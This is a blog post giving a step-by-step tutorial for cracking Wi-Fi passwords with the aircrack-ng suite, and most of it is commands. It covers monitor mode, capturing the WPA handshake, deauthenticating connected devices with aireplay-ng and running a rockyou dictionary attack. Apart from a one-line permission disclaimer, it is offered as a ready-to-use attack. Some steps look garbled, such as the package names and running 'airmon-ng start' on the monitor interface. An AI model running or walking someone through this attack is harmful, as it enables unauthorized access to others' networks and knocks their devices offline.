---
title: 'Wifi Password cracking'
date: 'July 8, 2022'
excerpt: 'This blog will help you to crack wifi password using airmon-ng.'
cover_image: '/images/posts/img1.jpg'
---

# Wifi Password Cracking with airmon-ng.

>This blog will help you to crack wifi password using airmon-ng.

>Disclaimer: Use this cracking method only if you own the wifi or you have permission to crack. Don't use it illegal.

>The following instruction will lead you to own any wifi (only if the password is available on wordlist).            
---
---
>Tools needed: 
* kali-linux
* airmon-ng
* airodump-ng
* aireplay-ng
* aircrack-ng

>Commands for installing packages 
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install airmon-ng airodump-ng aireplay-ng aircrack-ng
```

```bash
sudo airmon-ng check kill (to kill all processes and wifi will also be disabled)

sudo airmon-ng start wlan0 (to start wifi module)

sudo airmon-ng start wlan0mon (to start wifi into monitoring mode for capturing packets)

iwconfig (this command is only for checking whether wifi is in monitoring mode wlan0mon)

sudo airodump-ng wlan0mon (shows the details of wifi networks available nearby)
ctrl+c (stops capturing)
*copy the bssid and channel of wifi, which you want to get into.*

sudo airodump-ng wlan0mon -c <channel no.> --bssid <bssid> wlan0mon
(this command will show you one particular wifi network, you have to paste the channel no. and bssid of the particular wifi)

sudo airodump-ng wlan0mon -c <channel no.> --bssid <bssid> wlan0mon -w <name of the output file>
ctrl+c (stop capturing only after getting the 4-way handshake)(the next instruction will help you to capture the 4-way handshake)
(you have to specify any name in which the .cap captured flag will be saved)

*now open another terminal*
terminal 2: sudo aireplay-ng --deauth 0 -a <bssid> wlan0mon
           (this command will deauthenticate/disconnect the already connected devices to that wifi. So that we can get the 4-way handshake)

*now the 4-way handshake will be saved in terminal 1*

ctrl+c (stop capturing only after getting the 4-way handshake)

*the captured file will be saved as .cap file in you directory*

sudo airmon-ng stop wlan0mon (this command stops monitoring mode)

sudo service network-manager start (restarts your wifi)

aircrack-ng <name of the .cap file> -w /usr/share/wordlists/rockyou.txt
*you have to specify the name of your .cap file and full path to the wordlist*

```
>It will start cracking the password. This attack is known as bruteforce attack or dictionary attack.

>Password will be cracked only if the password is available on the wordlist you are specifying.

>Save your wifi by having a strong password.
